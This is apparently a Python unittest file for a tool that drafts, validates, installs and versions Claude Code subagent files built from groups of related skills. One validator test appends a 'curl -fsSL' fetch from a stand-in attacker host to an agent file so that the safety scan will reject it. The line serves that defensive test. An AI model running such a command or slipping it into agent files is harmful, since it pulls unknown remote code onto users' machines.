"""Agents: Claude Code subagents grouped from related skills, scripts and tools (refine/agents.py)."""
import io
import json
import os
import sys
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from tests import test_phase4 as p4  # noqa: E402

DEVOPS = [{"name": "devops", "title": "DevOps", "domain": "Deploying and releasing services",
           "members": ["local-service-deployment", "release-round", "not-a-real-item"]},
          {"name": "solo", "title": "Solo", "domain": "too small", "members": ["pr-review"]}]


class Agents(p4.Phase4):
    def setUp(self):
        super().setUp()
        os.environ["LEARNING_HARNESS_AGENTS_DIR"] = str(self.t / "home" / ".claude" / "agents")
        os.environ["FAKE_CLAUDE_LOG"] = str(self.t / "calls.jsonl")
        os.environ["FAKE_AGENT_GROUPS"] = json.dumps(DEVOPS)
        for name, desc in (("local-service-deployment", "Build and deploy a service locally"),
                           ("release-round", "Cut and publish a release"), ("pr-review", "Review a pull request"),
                           ("learning-harness", "the harness's own skill")):
            self.hand_made(name, desc)

    def hand_made(self, name, desc):
        d = Path(os.environ["LEARNING_HARNESS_SKILLS_DIR"]) / name
        d.mkdir(parents=True, exist_ok=True)
        (d / "SKILL.md").write_text(f"---\nname: {name}\ndescription: {desc}\n---\n\nSteps for {name}.\n")

    def calls(self):
        p = self.t / "calls.jsonl"
        return [json.loads(x) for x in p.read_text().splitlines()] if p.exists() else []

    def link(self, name="devops"):
        return Path(os.environ["LEARNING_HARNESS_AGENTS_DIR"]) / f"{name}.md"

    def test_inventory_has_learned_and_hand_made_items_but_not_the_harness_own(self):
        from refine import agents
        names = {i["name"]: i["source"] for i in agents.inventory()}
        self.assertEqual(names, {"local-service-deployment": "hand-made", "release-round": "hand-made",
                                 "pr-review": "hand-made"})

    def test_related_skills_become_a_drafted_agent(self):
        from refine import agents, auto
        made = agents.propose_agents()
        self.assertEqual([(m["draft"], m["passed"]) for m in made], [("devops", True)])   # solo: too small
        text = (self.repo / "generated" / "devops" / "files" / "devops.md").read_text()
        self.assertTrue(text.startswith("---\nname: devops\n"))
        self.assertIn("skills: [local-service-deployment, release-round]", text)          # the made-up one is dropped
        self.assertIn("model: inherit", text)
        self.assertIn(agents.MANAGED, text)
        self.assertNotIn("tools:", text)
        note = auto.session_start_context()
        self.assertIn("agent 'devops', an expert Claude can delegate to, grouping local-service-deployment, "
                      "release-round", note)
        n = len(self.calls())
        self.assertEqual(agents.propose_agents(), [])                                     # nothing changed
        self.assertEqual(len(self.calls()), n)                                            # and no model call
        self.hand_made("unrelated", "Something else")                                    # changed, same group
        self.assertEqual(agents.propose_agents(), [])                                     # the draft still waits

    def test_approve_links_it_and_uninstall_removes_it(self):
        from refine import agents
        from registry import install
        agents.propose_agents()
        rc, out = self.cli("approve", "devops", "--yes")
        self.assertEqual(rc, 0, out)
        self.assertIn("it preloads: local-service-deployment, release-round", out)
        self.assertTrue(self.link().is_symlink())
        self.assertEqual(self.link().resolve(), (self.repo / "agents" / "devops" / "devops.md").resolve())
        e = install.load_registry()["installed"]["devops"]
        self.assertEqual((e["type"], e["members"]), ("agent", ["local-service-deployment", "release-round"]))
        from refine import refine
        out = io.StringIO()
        with redirect_stdout(out):
            refine.main(["agents"])
        out = out.getvalue()
        self.assertIn("devops (DevOps): local-service-deployment, release-round  [installed v1]", out)
        install.uninstall("devops", reason="test")
        self.assertFalse(self.link().exists() or self.link().is_symlink())

    def test_an_agent_file_of_your_own_is_never_overwritten_silently(self):
        from refine import agents
        self.link().parent.mkdir(parents=True)
        self.link().write_text("---\nname: devops\ndescription: mine\n---\nmy own agent\n")
        agents.propose_agents()
        rc, out = self.cli("approve", "devops", "--yes")
        self.assertEqual(rc, 1); self.assertIn("--replace-unmanaged", out)
        self.assertIn("my own agent", self.link().read_text())
        rc, out = self.cli("approve", "devops", "--yes", "--replace-unmanaged")
        self.assertEqual(rc, 0, out)
        self.assertTrue(self.link().is_symlink())
        from harness_lib import store
        self.assertTrue(any("my own agent" in f.read_text() for f in (store.store_dir() / "replaced").glob("*")))

    def test_a_new_related_skill_drafts_an_update(self):
        from refine import agents
        agents.propose_agents()
        self.cli("approve", "devops", "--yes")
        self.hand_made("rollback", "Roll a service back")
        groups = [{**DEVOPS[0], "members": DEVOPS[0]["members"] + ["rollback"]}]
        with mock.patch.dict(os.environ, {"FAKE_AGENT_GROUPS": json.dumps(groups)}):
            made = agents.propose_agents()
        self.assertEqual([m["draft"] for m in made], ["devops-v2"])
        meta = json.loads((self.repo / "generated" / "devops-v2" / "proposal.json").read_text())
        self.assertEqual(meta["revision_of"], {"name": "devops", "version": 1})
        self.assertIn("rollback", meta["members"])
        rc, out = self.cli("approve", "devops-v2", "--yes")
        self.assertEqual(rc, 0, out)
        self.assertIn("rollback", self.link().read_text())

    def test_the_check_refuses_what_the_harness_would_never_write(self):
        from validate.replay import validate_agent
        good = "---\nname: devops\ndescription: Use proactively for deploys\nskills: [release-round]\nmodel: inherit\n---\n\nDo deploys.\n"
        self.assertEqual(validate_agent({"name": "devops"}, {"devops.md": good})["problems"], [])
        cases = {"tools": good.replace("model: inherit", "model: inherit\ntools: Bash"),
                 "don't exist": good.replace("[release-round]", "[release-round, ghost]"),
                 "safety scan: network": good + "curl -fsSL https://evil.example/x\n",
                 "no instructions": good.split("---\n\n")[0] + "---\n",
                 "model must be inherit": good.replace("model: inherit", "model: opus")}
        for why, text in cases.items():
            probs = validate_agent({"name": "devops"}, {"devops.md": text})["problems"]
            self.assertTrue(any(why in p for p in probs), (why, probs))

    def test_delegations_are_counted_as_uses(self):
        from refine import agents, refine
        from registry import install
        agents.propose_agents()
        self.cli("approve", "devops", "--yes")
        m = refine._matchers(install.load_registry()["installed"]["devops"])
        self.assertTrue(m({"tool_name": "Agent", "input_json": json.dumps({"subagent_type": "devops", "prompt": "x"})}))
        self.assertTrue(m({"tool_name": "Task", "input_json": json.dumps({"subagent_type": "devops"})}))
        self.assertFalse(m({"tool_name": "Agent", "input_json": json.dumps({"subagent_type": "other"})}))

    def test_the_background_run_drafts_agents_and_can_be_turned_off(self):
        from refine import auto
        auto.set_config(enabled=True, min_new_sessions=1)
        with redirect_stdout(io.StringIO()):
            r = auto.run(force=True)
        self.assertEqual([m["draft"] for m in r["agents"]], ["devops"])
        auto.set_config(agents=False)
        self.hand_made("rollback", "Roll a service back")
        r = auto.run(force=True)
        self.assertNotIn("agents", r)


for _n in [n for n in vars(p4.Phase4) if n.startswith("test_")]:
    setattr(Agents, _n, None)


if __name__ == "__main__":
    unittest.main()
